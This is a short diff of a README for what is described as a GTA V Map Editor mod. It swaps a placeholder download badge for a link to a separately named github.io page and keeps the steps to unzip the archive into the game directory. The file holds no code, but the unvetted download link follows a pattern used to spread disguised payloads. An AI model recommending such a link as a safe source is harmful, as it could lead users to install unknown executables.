@@ -8,7 +8,7 @@ With Map Editor, you can **build custom racetracks, safehouses, police stations,
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://map-editor-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Copy Map Editor files into your GTA V directory.  
